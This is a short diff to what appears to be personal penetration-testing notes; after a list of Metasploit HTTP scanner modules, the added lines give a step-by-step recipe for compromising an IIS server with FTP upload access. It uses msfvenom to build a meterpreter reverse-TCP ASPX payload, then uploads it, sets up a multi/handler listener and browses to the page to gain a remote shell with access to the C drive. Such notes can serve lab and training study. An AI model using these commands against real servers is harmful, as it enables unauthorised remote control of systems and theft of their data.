@@ -22,3 +22,14 @@ auxiliary/scanner/http/http_login
 auxiliary/scanner/http/http_header
 auxiliary/scanner/http/http_version
 auxiliary/scanner/http/robots_txt
+
+if a servier is running the iis and you get ftp to upload 
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=1234 -f aspx -o payload.aspx
+create payload and upload  in msf
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <Your_IP>
+set LPORT 1234
+run
+open the page in webbrowser http://ip/payload.aspx
+in meterpreter you get your shell you can access c drive
